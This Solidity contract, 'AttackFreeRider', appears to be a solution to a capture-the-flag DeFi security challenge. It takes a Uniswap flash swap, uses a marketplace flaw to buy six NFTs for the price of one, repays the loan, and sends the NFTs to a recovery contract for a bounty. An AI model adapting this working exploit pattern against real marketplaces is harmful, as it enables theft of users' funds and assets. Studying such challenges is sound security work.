// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackFreeRider {

    IUniswapV2Pair private immutable pair;
    IMarketplace private immutable marketplace;
    address private immutable recoveryContract;

    IWETH private immutable weth;
    IERC721 private immutable nft;

    address private immutable player;

    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0,1,2,3,4,5];

    constructor(
        address _pair,
        address _marketplace,
        address _weth,
        address _nft,
        address _recoveryContract
    ) {
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function attack() external payable {
        // 1. Request flash swap of 15 WETH from uniswap
        bytes memory data = abi.encode(NFT_PRICE);
        pair.swap(NFT_PRICE, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // 2. Unwrap WETH to ETH
        weth.withdraw(NFT_PRICE);

        // 3. Buy 6 NFTs for only 15 total
        marketplace.buyMany{value: NFT_PRICE}(tokens);

        // 4. Pay back 15 WETH + 0.3% to pair contract
        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
        weth.deposit{value: amountToPayBack}();
        weth.transfer(address(pair), amountToPayBack);

        // 5. Send NFTs to recovery contract to retrieve bounty
        bytes memory data = abi.encode(player);
        for (uint256 i; i < tokens.length; i++) {
            nft.safeTransferFrom(address(this), recoveryContract, i, data);
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) pure public returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}